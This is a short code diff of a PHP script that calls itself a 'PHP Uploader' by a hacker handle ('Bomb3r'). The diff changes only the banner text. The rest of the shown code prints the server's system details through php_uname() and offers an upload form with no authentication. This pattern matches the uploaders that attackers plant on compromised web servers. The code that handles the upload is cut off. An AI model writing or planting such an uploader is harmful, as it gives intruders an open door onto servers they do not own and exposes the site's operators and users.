@@ -1,5 +1,5 @@
 <?php
-echo "PHP Uploader - Dz Bomb3r";
+echo "PHP Uploader - Bomb3r";
 echo "<br>".php_uname()."<br>";
 echo "<form method='post' enctype='multipart/form-data'>
 <input type='file' name='zb'><input type='submit' name='upload' value='upload'>
